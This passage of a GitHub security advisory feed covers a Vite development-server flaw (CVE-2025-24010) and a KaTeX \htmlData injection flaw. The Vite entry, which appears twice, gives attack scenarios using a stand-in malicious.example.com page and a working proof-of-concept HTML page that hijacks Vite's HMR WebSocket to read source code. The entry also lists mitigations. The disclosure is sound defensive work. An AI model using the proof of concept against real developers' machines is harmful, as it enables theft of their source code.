<ul>
<li>get the source code stolen by malicious websites</li>
<li>give the attacker access to functionalities that are not supposed to be exposed externally<ul>
<li>Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind <code>server.proxy</code> may have those functionalities.</li>
</ul>
</li>
</ul>
<p>Chrome 94+ users are not affected for [3], because <a href="https://developer.chrome.com/blog/private-network-access-update#chrome_94">sending a request to a private network page from public non-HTTPS page is forbidden</a> since Chrome 94.</p>
<h3 id="related-information">Related Information</h3>
<p>Safari has <a href="https://bugs.webkit.org/show_bug.cgi?id=171934">a bug that blocks requests to loopback addresses from HTTPS origins</a>. This means when the user is using Safari and Vite is listening on lookback addresses, there's another condition of "the malicious web page is served on HTTP" to make [1] and [2] to work.</p>
<h3 id="poc">PoC</h3>
<h4 id="2-lack-of-validation-on-the-origin-header-for-websocket-connections-3">[2]: Lack of validation on the Origin header for WebSocket connections</h4>
<ol>
<li>I used the <code>react</code> template which utilizes HMR functionality.</li>
</ol>
<pre><code>npm create vite@latest my-vue-app-react -- --template react
</code></pre>
<ol start="2">
<li>Then on a malicious server, serve the following POC html:</li>
</ol>
<pre><code class="language-html">&lt;!doctype html&gt;
&lt;html lang="en"&gt;
    &lt;head&gt;
        &lt;meta charset="utf-8" /&gt;
        &lt;title&gt;vite CSWSH&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;div id="logs"&gt;&lt;/div&gt;
        &lt;script&gt;
            const div = document.querySelectorAll('#logs')[0];
            const ws = new WebSocket('ws://localhost:5173','vite-hmr');
            ws.onmessage = event =&gt; {
                const logLine = document.createElement('p');
                logLine.innerHTML = event.data;
                div.append(logLine);
            };
        &lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<ol start="3">
<li>Kick off Vite</li>
</ol>
<pre><code>npm run dev
</code></pre>
<ol start="4">
<li>Load the development server (open <code>http://localhost:5173/</code>) as well as the malicious page in the browser. </li>
<li>Edit <code>src/App.jsx</code> file and intentionally place a syntax error</li>
<li>Notice how the malicious page can view the websocket messages and a snippet of the source code is exposed</li>
</ol>
<p>Here's a video demonstrating the POC:</p>
<p><a href="https://github.com/user-attachments/assets/a4ad05cd-0b34-461c-9ff6-d7c8663d6961">https://github.com/user-attachments/assets/a4ad05cd-0b34-461c-9ff6-d7c8663d6961</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6">https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24010">https://nvd.nist.gov/vuln/detail/CVE-2025-24010</a></li>
<li><a href="https://github.com/advisories/GHSA-vg6x-rcgg-rjx6">https://github.com/advisories/GHSA-vg6x-rcgg-rjx6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vg6x-rcgg-rjx6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-21T19:52:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Websites were able to send any requests to the development server and read the response in vite]]></title>
        <id>https://github.com/advisories/GHSA-vg6x-rcgg-rjx6</id>
        <link href="https://github.com/advisories/GHSA-vg6x-rcgg-rjx6"/>
        <updated>2025-01-21T19:52:56.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Vite allowed any websites to send any requests to the development server and read the response due to default CORS settings and lack of validation on the Origin header for WebSocket connections.</p>
<h3 id="upgrade-path">Upgrade Path</h3>
<p>Users that does not match either of the following conditions should be able to upgrade to a newer version of Vite that fixes the vulnerability without any additional configuration.</p>
<ul>
<li>Using the backend integration feature</li>
<li>Using a reverse proxy in front of Vite</li>
<li>Accessing the development server via a domain other than <code>localhost</code> or <code>*.localhost</code></li>
<li>Using a plugin / framework that connects to the WebSocket server on their own from the browser</li>
</ul>
<h4 id="using-the-backend-integration-feature">Using the backend integration feature</h4>
<p>If you are using the backend integration feature and not setting <a href="https://vite.dev/config/server-options.html#server-origin"><code>server.origin</code></a>, you need to add the origin of the backend server to the <a href="https://github.com/expressjs/cors#configuration-options"><code>server.cors.origin</code></a> option. Make sure to set a specific origin rather than <code>*</code>, otherwise any origin can access your development server.</p>
<h4 id="using-a-reverse-proxy-in-front-of-vite">Using a reverse proxy in front of Vite</h4>
<p>If you are using a reverse proxy in front of Vite and sending requests to Vite with a hostname other than <code>localhost</code> or <code>*.localhost</code>, you need to add the hostname to the new <a href="https://vite.dev/config/server-options.html#server-allowedhosts"><code>server.allowedHosts</code></a> option. For example, if the reverse proxy is sending requests to <code>http://vite:5173</code>, you need to add <code>vite</code> to the <code>server.allowedHosts</code> option.</p>
<h4 id="accessing-the-development-server-via-a-domain-other-than-localhost-or-localhost">Accessing the development server via a domain other than <code>localhost</code> or <code>*.localhost</code></h4>
<p>You need to add the hostname to the new <a href="https://vite.dev/config/server-options.html#server-allowedhosts"><code>server.allowedHosts</code></a> option. For example, if you are accessing the development server via <code>http://foo.example.com:8080</code>, you need to add <code>foo.example.com</code> to the <code>server.allowedHosts</code> option.</p>
<h4 id="using-a-plugin--framework-that-connects-to-the-websocket-server-on-their-own-from-the-browser">Using a plugin / framework that connects to the WebSocket server on their own from the browser</h4>
<p>If you are using a plugin / framework, try upgrading to a newer version of Vite that fixes the vulnerability. If the WebSocket connection appears not to be working, the plugin / framework may have a code that connects to the WebSocket server on their own from the browser.</p>
<p>In that case, you can either:</p>
<ul>
<li>fix the plugin / framework code to the make it compatible with the new version of Vite</li>
<li>set <code>legacy.skipWebSocketTokenCheck: true</code> to opt-out the fix for [2] while the plugin / framework is incompatible with the new version of Vite<ul>
<li>When enabling this option, <strong>make sure that you are aware of the security implications</strong> described in the impact section of [2] above.</li>
</ul>
</li>
</ul>
<h3 id="mitigation-without-upgrading-vite">Mitigation without upgrading Vite</h3>
<h4 id="1-permissive-default-cors-settings">[1]: Permissive default CORS settings</h4>
<p>Set <code>server.cors</code> to <code>false</code> or limit <code>server.cors.origin</code> to trusted origins.</p>
<h4 id="2-lack-of-validation-on-the-origin-header-for-websocket-connections">[2]: Lack of validation on the Origin header for WebSocket connections</h4>
<p>There aren't any mitigations for this.</p>
<h4 id="3-lack-of-validation-on-the-host-header-for-http-requests">[3]: Lack of validation on the Host header for HTTP requests</h4>
<p>Use Chrome 94+ or use HTTPS for the development server.</p>
<h3 id="details">Details</h3>
<p>There are three causes that allowed malicious websites to send any requests to the development server:</p>
<h4 id="1-permissive-default-cors-settings-1">[1]: Permissive default CORS settings</h4>
<p>Vite sets the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin"><code>Access-Control-Allow-Origin</code></a> header depending on <a href="https://vite.dev/config/server-options.html#server-cors"><code>server.cors</code></a> option. The default value was <code>true</code> which sets <code>Access-Control-Allow-Origin: *</code>. This allows websites on any origin to <code>fetch</code> contents served on the development server.</p>
<p>Attack scenario:</p>
<ol>
<li>The attacker serves a malicious web page (<code>http://malicious.example.com</code>).</li>
<li>The user accesses the malicious web page.</li>
<li>The attacker sends a <code>fetch('http://127.0.0.1:5173/main.js')</code> request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.</li>
<li>The attacker gets the content of <code>http://127.0.0.1:5173/main.js</code>.</li>
</ol>
<h4 id="2-lack-of-validation-on-the-origin-header-for-websocket-connections-1">[2]: Lack of validation on the Origin header for WebSocket connections</h4>
<p>Vite starts a WebSocket server to handle HMR and other functionalities. This WebSocket server <a href="https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/src/node/server/ws.ts#L145-L157">did not perform validation on the Origin header</a> and was vulnerable to Cross-Site WebSocket Hijacking (CSWSH) attacks. With that attack, an attacker can read and write messages on the WebSocket connection. Vite only sends some information over the WebSocket connection (<a href="https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/types/hmrPayload.d.ts#L12-L72">list of the file paths that changed, the file content where the errored happened, etc.</a>), but plugins can send arbitrary messages and may include more sensitive information.</p>
<p>Attack scenario:</p>
<ol>
<li>The attacker serves a malicious web page (<code>http://malicious.example.com</code>).</li>
<li>The user accesses the malicious web page.</li>
<li>The attacker runs <code>new WebSocket('http://127.0.0.1:5173', 'vite-hmr')</code> by JS in that malicious web page.</li>
<li>The user edits some files.</li>
<li>Vite sends some HMR messages over WebSocket.</li>
<li>The attacker gets the content of the HMR messages.</li>
</ol>
<h4 id="3-lack-of-validation-on-the-host-header-for-http-requests-1">[3]: Lack of validation on the Host header for HTTP requests</h4>
<p>Unless <a href="https://vite.dev/config/server-options.html#server-https"><code>server.https</code></a> is set, Vite starts the development server on HTTP. Non-HTTPS servers are vulnerable to DNS rebinding attacks without validation on the Host header. But Vite did not perform validation on the Host header. By exploiting this vulnerability, an attacker can send arbitrary requests to the development server bypassing the same-origin policy.</p>
<ol>
<li>The attacker serves a malicious web page that is served on <strong>HTTP</strong> (<code>http://malicious.example.com:5173</code>) (HTTPS won't work).</li>
<li>The user accesses the malicious web page.</li>
<li>The attacker changes the DNS to point to 127.0.0.1 (or other private addresses).</li>
<li>The attacker sends a <code>fetch('/main.js')</code> request by JS in that malicious web page.</li>
<li>The attacker gets the content of <code>http://127.0.0.1:5173/main.js</code> bypassing the same origin policy.</li>
</ol>
<h3 id="impact">Impact</h3>
<h4 id="1-permissive-default-cors-settings-2">[1]: Permissive default CORS settings</h4>
<p>Users with the default <code>server.cors</code> option may:</p>
<ul>
<li>get the source code stolen by malicious websites</li>
<li>give the attacker access to functionalities that are not supposed to be exposed externally<ul>
<li>Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind <code>server.proxy</code> may have those functionalities.</li>
</ul>
</li>
</ul>
<h4 id="2-lack-of-validation-on-the-origin-header-for-websocket-connections-2">[2]: Lack of validation on the Origin header for WebSocket connections</h4>
<p>All users may get the file paths of the files that changed and the file content where the error happened be stolen by malicious websites.</p>
<p>For users that is using a plugin that sends messages over WebSocket, that content may be stolen by malicious websites.</p>
<p>For users that is using a plugin that has a functionality that is triggered by messages over WebSocket, that functionality may be exploited by malicious websites.</p>
<h4 id="3-lack-of-validation-on-the-host-header-for-http-requests-2">[3]: Lack of validation on the Host header for HTTP requests</h4>
<p>Users using HTTP for the development server and using a browser that is not Chrome 94+ may:</p>
<ul>
<li>get the source code stolen by malicious websites</li>
<li>give the attacker access to functionalities that are not supposed to be exposed externally<ul>
<li>Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind <code>server.proxy</code> may have those functionalities.</li>
</ul>
</li>
</ul>
<p>Chrome 94+ users are not affected for [3], because <a href="https://developer.chrome.com/blog/private-network-access-update#chrome_94">sending a request to a private network page from public non-HTTPS page is forbidden</a> since Chrome 94.</p>
<h3 id="related-information">Related Information</h3>
<p>Safari has <a href="https://bugs.webkit.org/show_bug.cgi?id=171934">a bug that blocks requests to loopback addresses from HTTPS origins</a>. This means when the user is using Safari and Vite is listening on lookback addresses, there's another condition of "the malicious web page is served on HTTP" to make [1] and [2] to work.</p>
<h3 id="poc">PoC</h3>
<h4 id="2-lack-of-validation-on-the-origin-header-for-websocket-connections-3">[2]: Lack of validation on the Origin header for WebSocket connections</h4>
<ol>
<li>I used the <code>react</code> template which utilizes HMR functionality.</li>
</ol>
<pre><code>npm create vite@latest my-vue-app-react -- --template react
</code></pre>
<ol start="2">
<li>Then on a malicious server, serve the following POC html:</li>
</ol>
<pre><code class="language-html">&lt;!doctype html&gt;
&lt;html lang="en"&gt;
    &lt;head&gt;
        &lt;meta charset="utf-8" /&gt;
        &lt;title&gt;vite CSWSH&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;div id="logs"&gt;&lt;/div&gt;
        &lt;script&gt;
            const div = document.querySelectorAll('#logs')[0];
            const ws = new WebSocket('ws://localhost:5173','vite-hmr');
            ws.onmessage = event =&gt; {
                const logLine = document.createElement('p');
                logLine.innerHTML = event.data;
                div.append(logLine);
            };
        &lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<ol start="3">
<li>Kick off Vite</li>
</ol>
<pre><code>npm run dev
</code></pre>
<ol start="4">
<li>Load the development server (open <code>http://localhost:5173/</code>) as well as the malicious page in the browser. </li>
<li>Edit <code>src/App.jsx</code> file and intentionally place a syntax error</li>
<li>Notice how the malicious page can view the websocket messages and a snippet of the source code is exposed</li>
</ol>
<p>Here's a video demonstrating the POC:</p>
<p><a href="https://github.com/user-attachments/assets/a4ad05cd-0b34-461c-9ff6-d7c8663d6961">https://github.com/user-attachments/assets/a4ad05cd-0b34-461c-9ff6-d7c8663d6961</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6">https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24010">https://nvd.nist.gov/vuln/detail/CVE-2025-24010</a></li>
<li><a href="https://github.com/advisories/GHSA-vg6x-rcgg-rjx6">https://github.com/advisories/GHSA-vg6x-rcgg-rjx6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vg6x-rcgg-rjx6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-21T19:52:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[katex] KaTeX \htmlData does not validate attribute names]]></title>
        <id>https://github.com/advisories/GHSA-cg87-wmx4-v546</id>
        <link href="https://github.com/advisories/GHSA-cg87-wmx4-v546"/>
        <updated>2025-01-21T18:31:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>KaTeX users who render untrusted mathematical expressions with <code>renderToString</code> could encounter malicious input using <code>\htmlData</code> that runs arbitrary JavaScript, or generate invalid HTML.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to KaTeX v0.16.21 to remove this vulnerability.</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Avoid use of or turn off the <code>trust</code> option, or set it to forbid <code>\htmlData</code> commands.</li>
<li>Forbid inputs containing the substring <code>"\\htmlData"</code>.</li>
<li>Sanitize HTML output from KaTeX.</li>
</ul>
<h3 id="details">Details</h3>
<p><code>\htmlData</code> did not validate its attribute name argument, allowing it to generate invalid or malicious HTML that runs scripts.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue or security advisory in the <a href="https://github.com/KaTeX/KaTeX/">KaTeX repository</a></li>
<li>Email us at <a href="mailto:katex-security@mit.edu">katex-security@mit.edu</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/KaTeX/KaTeX/security/advisories/GHSA-cg87-wmx4-v546">https://github.com/KaTeX/KaTeX/security/advisories/GHSA-cg87-wmx4-v546</a></li>
<li><a href="https://github.com/KaTeX/KaTeX/commit/ff289955e81aab89086eef09254cbf88573d415c">https://github.com/KaTeX/KaTeX/commit/ff289955e81aab89086eef09254cbf88573d415c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-23207">https://nvd.nist.gov/vuln/detail/CVE-2025-23207</a></li>
<li><a href="https://github.com/advisories/GHSA-cg87-wmx4-v546">https://github.com/advisories/GHSA-cg87-wmx4-v546</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cg87-wmx4-v546</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-17T21:22:56.000Z</published>
    </entry>
</feed>